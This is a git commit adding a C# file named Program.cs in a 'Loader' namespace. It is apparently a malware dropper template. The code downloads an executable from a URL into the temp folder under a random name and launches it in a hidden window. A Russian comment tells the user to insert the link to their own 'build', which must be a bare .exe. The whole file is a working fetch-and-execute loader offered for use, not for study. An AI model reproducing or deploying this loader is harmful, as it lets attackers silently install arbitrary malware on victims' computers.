aede6469f13741f0bc58a0fa2bb410540d023374
r3vengerx0 <112510447+r3vengerx0@users.noreply.github.com>
2023-01-02 15:15:50 +0300

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Net;
+using System.IO;
+using Microsoft.Win32;
+using System.Diagnostics;
+
+namespace Loader
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string url = ""; // Внутри кавычек вставляешь ссылку на свой билд(он обязательно должен быть чисто .exe,не находится в архиве итд)
+            string FileLocate = FileName();
+
+            FileName();
+            Download(FileLocate, url);
+            Runprocess(FileLocate);
+        }
+
+        private static void Download(string FileLocate, string url)
+        {
+            WebClient client = new WebClient();
+            client.DownloadFile(new Uri(url), FileLocate + ".exe");
+        }
+
+        private static string FileName()
+        {
+            string Temp = Path.GetTempPath();
+            string Ran = Path.GetRandomFileName();
+            string FileLocate = Temp + Ran;
+            return FileLocate;
+        }
+
+        private static void Runprocess(string FileLocate)
+        {
+            Process process = new Process
+            {
+                StartInfo =
+                {
+                    FileName = FileLocate + ".exe", WindowStyle = ProcessWindowStyle.Hidden }
+            };
+            process.Start();
+        }
+    }
+}
